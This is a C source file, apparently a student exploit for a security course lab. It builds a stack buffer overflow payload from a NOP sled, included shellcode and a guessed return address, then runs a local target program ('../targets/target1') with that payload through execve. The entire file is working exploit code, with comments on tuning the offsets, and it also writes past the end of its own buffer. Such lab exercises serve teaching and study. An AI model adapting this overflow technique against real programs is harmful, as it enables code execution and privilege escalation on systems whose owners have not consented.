#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define BUFSIZE 141 //can be 142 = 128+8(rsp)+6(rip)/return address 
#define TARGET_ADDR 0x40a4fe10 //if 40a4fe00, 00 will cause problems
#define SHELL_SIZE 45
#define NOP 0x90
#define RETURN_SPACE 5 //6
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char buf_overflow[BUFSIZE];
	int i;

	long *ptr = (long *) buf_overflow;
	
	//char target_addr[] = "\x40\xa4\xfe\x10"; 
	char target_addr[] = "\x10\xfe\xa4\x40";
	
	//fill the tail of buf with guessed return address
	for (i=0; i < 4; i++)
		buf_overflow[BUFSIZE-RETURN_SPACE+i] = target_addr[i];
	
	//fill in the shellcode before guessed return address
	for(i=BUFSIZE - SHELL_SIZE - RETURN_SPACE; i < BUFSIZE-RETURN_SPACE; i++)
		buf_overflow[i] = shellcode[i - BUFSIZE + SHELL_SIZE +
		RETURN_SPACE];
	
	//fill the first(rest) part of buf with NOPs
	for(i = 0; i < BUFSIZE - SHELL_SIZE - RETURN_SPACE; i++)
		buf_overflow[i] = NOP;

  
	buf_overflow[BUFSIZE-1] = '\x00';
	buf_overflow[BUFSIZE] = '\x00';
	buf_overflow[BUFSIZE+1] = '\x00';
	buf_overflow[BUFSIZE+2] = '\0';
	//buf_overflow[BUFSIZE+3] = '\0';
		
	args[0] = TARGET;
	args[1] = buf_overflow;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
